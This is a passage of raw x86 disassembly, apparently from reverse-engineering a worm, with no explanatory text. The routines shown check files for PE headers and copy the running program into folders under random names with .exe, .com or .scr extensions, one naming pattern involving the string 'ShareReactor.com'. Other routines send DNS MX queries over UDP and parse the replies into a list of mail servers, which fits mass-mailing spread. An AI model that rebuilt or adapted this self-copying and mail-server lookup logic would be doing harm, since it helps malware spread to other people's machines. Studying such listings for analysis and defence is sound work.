		sbb	eax, eax
		neg	eax
		leave
		retn
sub_803108	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80317F	proc near		; CODE XREF: sub_807B94+25p
					; sub_807C77+45p

var_48		= dword	ptr -48h
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
Buffer		= dword	ptr -20h
var_1A		= word ptr -1Ah
var_C		= word ptr -0Ch
lDistanceToMove	= dword	ptr -8
NumberOfBytesRead= dword ptr -4
hFile		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		push	ebx
		push	esi
		xor	esi, esi
		push	edi
		mov	edi, ds:SetFilePointer
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		push	3Ch		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		call	edi ; SetFilePointer
		lea	eax, [ebp+NumberOfBytesRead]
		mov	ebx, ds:ReadFile
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		lea	eax, [ebp+lDistanceToMove]
		push	4		; nNumberOfBytesToRead
		push	eax		; lpBuffer
		mov	[ebp+NumberOfBytesRead], esi
		push	[ebp+hFile]	; hFile
		call	ebx ; ReadFile
		cmp	[ebp+NumberOfBytesRead], 4
		jnz	loc_80325E
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		push	[ebp+hFile]	; hFile
		call	edi ; SetFilePointer
		cmp	eax, [ebp+lDistanceToMove]
		jnz	loc_80325E
		lea	eax, [ebp+NumberOfBytesRead]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		lea	eax, [ebp+Buffer]
		push	16h		; nNumberOfBytesToRead
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ebx ; ReadFile
		cmp	[ebp+NumberOfBytesRead], 16h
		jnz	short loc_80325E
		mov	eax, [ebp+Buffer]
		mov	[ebp+NumberOfBytesRead], 500h
		xor	eax, 4550h
		test	ax, ax
		jnz	short loc_80325E
		cmp	[ebp+var_1A], si
		jz	short loc_80325E
		cmp	[ebp+var_1A], 0Ah
		ja	short loc_80325E
		movzx	eax, [ebp+var_C]
		mov	ecx, [ebp+lDistanceToMove]
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		lea	eax, [ecx+eax+18h]
		push	eax		; lDistanceToMove
		mov	[ebp+lDistanceToMove], eax
		push	[ebp+hFile]	; hFile
		call	edi ; SetFilePointer
		xor	edi, edi
		cmp	[ebp+var_1A], si
		mov	[ebp+lDistanceToMove], esi
		jbe	short loc_80325A

loc_803227:				; CODE XREF: sub_80317F+D9j
		lea	eax, [ebp+NumberOfBytesRead]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		lea	eax, [ebp+var_48]
		push	28h		; nNumberOfBytesToRead
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile
		mov	[ebp+NumberOfBytesRead], esi
		call	ebx ; ReadFile
		cmp	[ebp+NumberOfBytesRead], 28h
		jnz	short loc_80325E
		mov	eax, [ebp+var_34]
		mov	ecx, [ebp+var_38]
		add	eax, ecx
		cmp	eax, edi
		jbe	short loc_80324E
		mov	edi, eax

loc_80324E:				; CODE XREF: sub_80317F+CBj
		movzx	eax, [ebp+var_1A]
		inc	[ebp+lDistanceToMove]
		cmp	[ebp+lDistanceToMove], eax
		jb	short loc_803227

loc_80325A:				; CODE XREF: sub_80317F+A6j
		mov	eax, edi
		jmp	short loc_803260
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80325E:				; CODE XREF: sub_80317F+37j
					; sub_80317F+4Aj ...
		xor	eax, eax

loc_803260:				; CODE XREF: sub_80317F+DDj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_80317F	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_803265	proc near		; CODE XREF: sub_803352+27p

NewFileName	= byte ptr -200h
lpExistingFileName= dword ptr  8
lpString2	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 200h
		push	[ebp+lpString2]	; lpString2
		lea	eax, [ebp+NewFileName]
		push	eax		; lpString1
		call	ds:lstrcpyA
		cmp	[ebp+NewFileName], 0
		jz	locret_803350
		push	ebx
		mov	ebx, ds:lstrlenA
		push	esi
		push	edi
		lea	eax, [ebp+NewFileName]
		lea	edi, [ebp+NewFileName]
		push	eax		; lpString
		dec	edi
		call	ebx ; lstrlenA
		cmp	byte ptr [eax+edi], 2Fh
		mov	esi, ds:lstrcatA
		jz	short loc_8032CD
		lea	eax, [ebp+NewFileName]
		push	eax		; lpString
		call	ebx ; lstrlenA
		cmp	byte ptr [eax+edi], 5Ch
		jz	short loc_8032CD
		lea	eax, [ebp+NewFileName]
		push	offset String2	; lpString2
		push	eax		; lpString1
		call	esi ; lstrcatA

loc_8032CD:				; CODE XREF: sub_803265+49j
					; sub_803265+58j
		call	sub_802E9C
		movzx	eax, ax
		push	7
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+NewFileName]
		push	ds:lpString2[edx*4] ; lpString2
		push	eax		; lpString1
		call	esi ; lstrcatA
		lea	eax, [ebp+NewFileName]
		push	offset a__0	; lpString2
		push	eax		; lpString1
		call	esi ; lstrcatA
		call	sub_802E9C
		movzx	eax, ax
		push	3
		cdq
		pop	ecx
		idiv	ecx
		sub	edx, 0
		jz	short loc_80332D
		dec	edx
		jz	short loc_803326
		dec	edx
		lea	eax, [ebp+NewFileName]
		jz	short loc_80331F
		push	offset aScr	; "scr"
		jmp	short loc_803338
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80331F:				; CODE XREF: sub_803265+B1j
		push	offset aSharereactor_c ; "ShareReactor.com"
		jmp	short loc_803338
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803326:				; CODE XREF: sub_803265+A8j
		push	offset aCom	; "com"
		jmp	short loc_803332
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80332D:				; CODE XREF: sub_803265+A5j
		push	offset aExe	; lpString2

loc_803332:				; CODE XREF: sub_803265+C6j
		lea	eax, [ebp+NewFileName]

loc_803338:				; CODE XREF: sub_803265+B8j
					; sub_803265+BFj
		push	eax		; lpString1
		call	esi ; lstrcatA
		lea	eax, [ebp+NewFileName]
		push	1		; bFailIfExists
		push	eax		; lpNewFileName
		push	[ebp+lpExistingFileName] ; lpExistingFileName
		call	ds:CopyFileA
		pop	edi
		pop	esi
		pop	ebx

locret_803350:				; CODE XREF: sub_803265+20j
		leave
		retn
sub_803265	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_803352	proc near		; CODE XREF: sub_804D32+ADp

Filename	= byte ptr -104h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 104h
		lea	eax, [ebp+Filename]
		push	104h		; nSize
		push	eax		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		push	[ebp+arg_0]
		lea	eax, [ebp+Filename]
		push	eax
		call	sub_803265
		pop	ecx
		pop	ecx
		leave
		retn
sub_803352	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_803382	proc near		; CODE XREF: sub_8036E5+8Fp

buf		= byte ptr -400h
var_3FC		= word ptr -3FCh
var_3FA		= word ptr -3FAh
var_3F8		= word ptr -3F8h
var_3F6		= word ptr -3F6h
var_3F4		= dword	ptr -3F4h
s		= dword	ptr  8
to		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= word ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 400h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_8]
		xor	ebx, ebx
		push	400h
		lea	eax, [ebp+buf]
		push	ebx
		push	eax
		call	memset
		add	esp, 0Ch
		call	ds:GetTickCount
		mov	word ptr [ebp+buf], ax
		mov	ax, [ebp+arg_C]
		push	1		; hostshort
		mov	[ebp-3FEh], ax
		call	ds:htons
		xor	edx, edx
		mov	[ebp+var_3FC], ax
		cmp	[edi], dl
		mov	[ebp+var_3FA], bx
		mov	[ebp+var_3F8], bx
		mov	[ebp+var_3F6], bx
		jz	short loc_803440

loc_8033EA:				; CODE XREF: sub_803382+BAj
		lea	esi, [ebx+edi]
		mov	eax, ebx
		mov	cl, [esi]
		jmp	short loc_8033FC
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8033F3:				; CODE XREF: sub_803382+7Cj
		cmp	cl, 2Eh
		jz	short loc_803400
		inc	eax
		mov	cl, [eax+edi]

loc_8033FC:				; CODE XREF: sub_803382+6Fj
		test	cl, cl
		jnz	short loc_8033F3

loc_803400:				; CODE XREF: sub_803382+74j
		mov	cl, al
		sub	cl, bl
		mov	byte ptr [ebp+edx+var_3F4], cl
		inc	edx
		cmp	ebx, eax
		jge	short loc_80342E
		sub	eax, ebx
		lea	edi, [ebp+edx+var_3F4]
		mov	ecx, eax
		add	ebx, eax
		mov	dword ptr [ebp+arg_C], ecx
		shr	ecx, 2
		rep movsd
		mov	ecx, eax
		and	ecx, 3
		add	edx, eax
		rep movsb

loc_80342E:				; CODE XREF: sub_803382+8Cj
		mov	edi, [ebp+arg_8]
		cmp	byte ptr [ebx+edi], 2Eh
		jnz	short loc_803438
		inc	ebx

loc_803438:				; CODE XREF: sub_803382+B3j
		cmp	byte ptr [ebx+edi], 0
		jnz	short loc_8033EA
		xor	ebx, ebx

loc_803440:				; CODE XREF: sub_803382+66j
		mov	edi, ds:htons
		and	byte ptr [ebp+edx+var_3F4], 0
		push	0Fh		; hostshort
		lea	esi, [edx+0Dh]
		call	edi ; htons
		mov	word ptr [ebp+esi+buf],	ax
		inc	esi
		push	1		; hostshort
		inc	esi
		call	edi ; htons
		push	10h		; tolen
		mov	word ptr [ebp+esi+buf],	ax
		push	[ebp+to]	; to
		add	esi, 2
		lea	eax, [ebp+buf]
		push	ebx		; flags
		push	esi		; len
		push	eax		; buf
		push	[ebp+s]		; s
		call	ds:sendto
		xor	ecx, ecx
		pop	edi
		test	eax, eax
		setle	cl
		pop	esi
		mov	eax, ecx
		pop	ebx
		leave
		retn
sub_803382	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_803493	proc near		; CODE XREF: sub_80359E+2Cp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		push	esi
		mov	esi, eax
		mov	ax, [ebx+4]
		push	edi
		mov	edi, ds:ntohs
		push	eax		; netshort
		call	edi ; ntohs
		test	ax, ax
		jbe	short loc_8034E6

loc_8034B1:				; CODE XREF: sub_803493+51j
		cmp	esi, [ebp+arg_4]
		jge	short loc_8034E6
		mov	eax, [ebp+arg_0]
		movzx	eax, byte ptr [eax+esi]
		test	eax, eax
		jnz	short loc_8034C6
		add	esi, 5
		jmp	short loc_8034D4
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8034C6:				; CODE XREF: sub_803493+2Cj
		cmp	eax, 40h
		jge	short loc_8034D1
		lea	esi, [esi+eax+1]
		jmp	short loc_8034D7
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8034D1:				; CODE XREF: sub_803493+36j
		add	esi, 6

loc_8034D4:				; CODE XREF: sub_803493+31j
		inc	[ebp+var_4]

loc_8034D7:				; CODE XREF: sub_803493+3Cj
		mov	ax, [ebx+4]
		push	eax		; netshort
		call	edi ; ntohs
		movzx	eax, ax
		cmp	[ebp+var_4], eax
		jl	short loc_8034B1

loc_8034E6:				; CODE XREF: sub_803493+1Cj
					; sub_803493+21j
		mov	eax, esi
		pop	edi
		pop	esi
		leave
		retn
sub_803493	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8034EC	proc near		; CODE XREF: sub_80359E+8Dp
					; sub_8036E5+1D9p

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	[ebp+var_8], 0
		and	byte ptr [edi],	0
		and	[ebp+var_4], 0
		push	esi
		xor	esi, esi
		cmp	eax, [ebp+arg_0]
		jge	short loc_80356F

loc_803504:				; CODE XREF: sub_8034EC+70j
		cmp	esi, 0FFh
		jge	short loc_80356B
		lea	ecx, [ebx+eax]
		movzx	edx, byte ptr [ecx]
		test	edx, edx
		jz	short loc_803560
		cmp	edx, 40h
		jge	short loc_803532
		inc	eax
		test	edx, edx
		jle	short loc_80352B

loc_803520:				; CODE XREF: sub_8034EC+3Dj
		mov	cl, [ebx+eax]
		mov	[esi+edi], cl
		inc	esi
		inc	eax
		dec	edx
		jnz	short loc_803520

loc_80352B:				; CODE XREF: sub_8034EC+32j
		mov	byte ptr [esi+edi], 2Eh
		inc	esi
		jmp	short loc_803559
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803532:				; CODE XREF: sub_8034EC+2Dj
		cmp	[ebp+var_4], 0
		jnz	short loc_80353E
		add	eax, 2
		mov	[ebp+var_8], eax

loc_80353E:				; CODE XREF: sub_8034EC+4Aj
		mov	ax, [ecx]
		mov	[ebp+var_4], 1
		push	eax		; netshort
		call	ds:ntohs
		and	eax, 3FFFh
		cmp	eax, [ebp+arg_0]
		jge	short loc_80356B

loc_803559:				; CODE XREF: sub_8034EC+44j
		cmp	eax, [ebp+arg_0]
		jl	short loc_803504
		jmp	short loc_80356B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803560:				; CODE XREF: sub_8034EC+28j
		inc	eax
		jmp	short loc_80356B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803563:				; CODE XREF: sub_8034EC+81j
		cmp	byte ptr [edi+esi-1], 2Eh
		jnz	short loc_80356F
		dec	esi

loc_80356B:				; CODE XREF: sub_8034EC+1Ej
					; sub_8034EC+6Bj ...
		test	esi, esi
		jg	short loc_803563

loc_80356F:				; CODE XREF: sub_8034EC+16j
					; sub_8034EC+7Cj
		and	byte ptr [esi+edi], 0
		cmp	[ebp+var_4], 0
		pop	esi
		jz	short locret_80357D
		mov	eax, [ebp+var_8]

locret_80357D:				; CODE XREF: sub_8034EC+8Cj
		leave
		retn
sub_8034EC	endp


;  S U B	R O U T	I N E 


sub_80357F	proc near		; CODE XREF: sub_8036E5+221p
		test	eax, eax
		jz	short locret_80359D
		push	esi

loc_803584:				; CODE XREF: sub_80357F+1Bj
		mov	esi, [eax]
		push	eax		; lpMem
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapFree
		test	esi, esi
		mov	eax, esi
		jnz	short loc_803584
		pop	esi

locret_80359D:				; CODE XREF: sub_80357F+2j
		retn
sub_80357F	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80359E	proc near		; CODE XREF: sub_8036E5+13Bp

var_128		= dword	ptr -128h
var_124		= dword	ptr -124h
var_20		= word ptr -20h
var_1E		= word ptr -1Eh
var_1C		= word ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 128h
		push	edi
		push	0Ch
		pop	eax
		xor	edi, edi
		cmp	[ebp+arg_4], eax
		mov	[ebp+var_4], edi
		mov	[ebp+var_C], edi
		jge	short loc_8035BF
		xor	eax, eax
		jmp	loc_8036E2
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8035BF:				; CODE XREF: sub_80359E+18j
		push	ebx
		push	esi
		push	[ebp+arg_4]
		mov	esi, [ebp+arg_0]
		mov	ebx, esi
		push	esi
		call	sub_803493
		mov	ebx, eax
		pop	ecx
		cmp	ebx, [ebp+arg_4]
		pop	ecx
		jl	short loc_8035DF
		xor	eax, eax
		jmp	loc_8036E0
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8035DF:				; CODE XREF: sub_80359E+38j
		movzx	eax, word ptr [esi+0Ah]
		movzx	ecx, word ptr [esi+8]
		add	eax, ecx
		mov	[ebp+var_8], edi
		movzx	ecx, word ptr [esi+6]
		add	eax, ecx
		cmp	eax, edi
		mov	[ebp+var_10], eax
		jle	loc_8036DD
		jmp	short loc_803602
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8035FF:				; CODE XREF: sub_80359E+139j
		mov	esi, [ebp+arg_0]

loc_803602:				; CODE XREF: sub_80359E+5Fj
		cmp	ebx, [ebp+arg_4]
		jge	loc_8036DD
		push	114h
		lea	eax, [ebp+var_128]
		push	0
		push	eax
		call	memset
		push	[ebp+arg_4]
		mov	eax, ebx
		lea	edi, [ebp+var_124]
		mov	ebx, esi
		call	sub_8034EC
		mov	ebx, eax
		add	esp, 10h
		lea	eax, [ebx+0Ah]
		cmp	eax, [ebp+arg_4]
		jge	loc_8036DD
		mov	ax, [ebx+esi]
		mov	edi, ds:ntohs
		push	eax		; netshort
		call	edi ; ntohs
		inc	ebx
		mov	[ebp+var_20], ax
		inc	ebx
		mov	ax, [ebx+esi]
		push	eax		; netshort
		call	edi ; ntohs
		add	ebx, 6
		mov	[ebp+var_1E], ax
		mov	ax, [ebx+esi]
		push	eax		; netshort
		call	edi ; ntohs
		mov	[ebp+var_1C], ax
		inc	ebx
		movzx	eax, ax
		inc	ebx
		add	eax, ebx
		mov	[ebp+var_18], ebx
		cmp	eax, [ebp+arg_4]
		jg	short loc_8036DD
		mov	esi, 124h
		push	esi		; dwBytes
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		mov	edi, eax
		test	edi, edi
		mov	[ebp+var_14], edi
		jz	short loc_8036DD
		push	esi
		push	0
		push	edi
		call	memset
		add	esp, 0Ch
		lea	esi, [ebp+var_128]
		push	45h
		pop	ecx
		rep movsd
		movzx	eax, [ebp+var_1C]
		mov	ecx, [ebp+var_4]
		add	ebx, eax
		mov	eax, [ebp+var_14]
		mov	[ebp+var_4], eax
		and	dword ptr [eax], 0
		test	ecx, ecx
		jnz	short loc_8036CC
		mov	[ebp+var_C], eax
		jmp	short loc_8036CE
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8036CC:				; CODE XREF: sub_80359E+127j
		mov	[ecx], eax

loc_8036CE:				; CODE XREF: sub_80359E+12Cj
		inc	[ebp+var_8]
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+var_10]
		jl	loc_8035FF

loc_8036DD:				; CODE XREF: sub_80359E+59j
					; sub_80359E+67j ...
		mov	eax, [ebp+var_C]

loc_8036E0:				; CODE XREF: sub_80359E+3Cj
		pop	esi
		pop	ebx

loc_8036E2:				; CODE XREF: sub_80359E+1Cj
		pop	edi
		leave
		retn
sub_80359E	endp


;  S U B	R O U T	I N E 


sub_8036E5	proc near		; CODE XREF: sub_803968+11p

var_128		= dword	ptr -128h
var_124		= dword	ptr -124h
var_120		= dword	ptr -120h
var_11C		= dword	ptr -11Ch
var_118		= dword	ptr -118h
s		= dword	ptr -114h
var_110		= dword	ptr -110h
timeout		= timeval ptr -10Ch
readfds		= fd_set ptr -104h
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_8]
		sub	esp, 128h
		push	ebx
		push	ebp
		push	esi
		mov	esi, ds:GetProcessHeap
		xor	ebp, ebp
		push	1000h		; dwBytes
		push	ebp		; dwFlags
		mov	dword ptr [eax], 1
		call	esi ; GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		mov	ebx, eax
		cmp	ebx, ebp
		jnz	short loc_80371C
		xor	eax, eax
		jmp	loc_80395E
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80371C:				; CODE XREF: sub_8036E5+2Ej
		push	edi
		push	11h		; protocol
		push	2		; type
		push	2		; af
		call	ds:socket
		mov	edi, eax
		cmp	edi, ebp
		mov	[esp+138h+s], edi
		jz	loc_803950
		cmp	edi, 0FFFFFFFFh
		jz	loc_803950
		mov	[esp+138h+var_124], ebp
		jmp	short loc_80374C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803746:				; CODE XREF: sub_8036E5+236j
		mov	edi, [esp+138h+s]
		xor	ebp, ebp

loc_80374C:				; CODE XREF: sub_8036E5+5Fj
		cmp	[esp+138h+var_124], ebp
		mov	[esp+138h+var_120], ebp
		jnz	short loc_80375D
		push	100h
		jmp	short loc_80375E
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80375D:				; CODE XREF: sub_8036E5+6Fj
		push	ebp		; hostshort

loc_80375E:				; CODE XREF: sub_8036E5+76j
		call	ds:htons
		push	eax
		push	[esp+13Ch+arg_4]
		push	[esp+140h+arg_0]
		push	edi
		call	sub_803382
		add	esp, 10h
		test	eax, eax
		jnz	loc_803912
		push	0Ch
		lea	eax, [esp+13Ch+timeout]
		pop	esi
		mov	[esp+138h+readfds.fd_array], edi
		push	eax		; timeout
		push	ebp		; exceptfds
		lea	eax, [esp+140h+readfds]
		push	ebp		; writefds
		push	eax		; readfds
		push	ebp		; nfds
		mov	[esp+14Ch+readfds.fd_count], 1
		mov	[esp+14Ch+timeout.tv_sec], esi
		mov	[esp+14Ch+timeout.tv_usec], ebp
		call	ds:select
		test	eax, eax
		jle	loc_803912
		push	4
		push	ebp
		push	ebx
		call	memset
		add	esp, 0Ch
		push	ebp		; flags
		push	1000h		; len
		push	ebx		; buf
		push	edi		; s
		call	ds:recv
		mov	ebp, eax
		test	ebp, ebp
		mov	[esp+138h+var_110], ebp
		jle	loc_803912
		cmp	ebp, esi
		jbe	loc_803912
		mov	ax, [ebx+2]
		mov	edi, ds:ntohs
		push	eax		; netshort
		call	edi ; ntohs
		mov	si, ax
		and	esi, 0Fh
		cmp	esi, 3
		jz	loc_803923
		cmp	esi, 2
		jnz	short loc_803816
		mov	ax, [ebx+2]
		push	eax		; netshort
		call	edi ; ntohs
		test	al, al
		js	loc_803923

loc_803816:				; CODE XREF: sub_8036E5+120j
		test	esi, esi
		jnz	loc_803912
		push	ebp
		push	ebx
		call	sub_80359E
		pop	ecx
		mov	[esp+13Ch+var_118], eax
		test	eax, eax
		pop	ecx
		jz	loc_803912
		and	[esp+138h+var_11C], esi
		and	[esp+138h+var_120], esi
		mov	edi, eax
		mov	[esp+138h+var_128], edi
		jmp	short loc_803847
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803843:				; CODE XREF: sub_8036E5+217j
		mov	edi, [esp+138h+var_128]

loc_803847:				; CODE XREF: sub_8036E5+15Cj
		cmp	word ptr [edi+10Ah], 1
		jnz	loc_8038F4
		cmp	word ptr [edi+108h], 0Fh
		jnz	loc_8038F4
		cmp	word ptr [edi+10Ch], 3
		jb	loc_8038F4
		mov	ebp, 108h
		push	ebp		; dwBytes
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		mov	esi, eax
		test	esi, esi
		jz	short loc_803902
		push	ebp
		push	0
		push	esi
		call	memset
		add	edi, 110h
		add	esp, 0Ch
		mov	eax, [edi]
		mov	ax, [eax+ebx]
		push	eax		; netshort
		call	ds:ntohs
		movzx	eax, ax
		push	[esp+138h+var_110]
		mov	[esi+4], eax
		mov	eax, [edi]
		lea	ebp, [esi+8]
		inc	eax
		mov	edi, ebp
		inc	eax
		call	sub_8034EC
		cmp	byte ptr [ebp+0], 0
		pop	ecx
		jnz	short loc_8038DC
		push	esi		; lpMem
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapFree
		jmp	short loc_8038F0
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8038DC:				; CODE XREF: sub_8036E5+1E3j
		mov	eax, [esp+138h+var_11C]
		mov	[esp+138h+var_11C], esi
		test	eax, eax
		jnz	short loc_8038EE
		mov	[esp+138h+var_120], esi
		jmp	short loc_8038F0
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8038EE:				; CODE XREF: sub_8036E5+201j
		mov	[eax], esi

loc_8038F0:				; CODE XREF: sub_8036E5+1F5j
					; sub_8036E5+207j
		mov	edi, [esp+138h+var_128]

loc_8038F4:				; CODE XREF: sub_8036E5+16Aj
					; sub_8036E5+178j ...
		mov	edi, [edi]
		test	edi, edi
		mov	[esp+138h+var_128], edi
		jnz	loc_803843

loc_803902:				; CODE XREF: sub_8036E5+1A5j
		mov	eax, [esp+138h+var_118]
		call	sub_80357F
		cmp	[esp+138h+var_120], 0
		jnz	short loc_803930

loc_803912:				; CODE XREF: sub_8036E5+99j
					; sub_8036E5+CBj ...
		inc	[esp+138h+var_124]
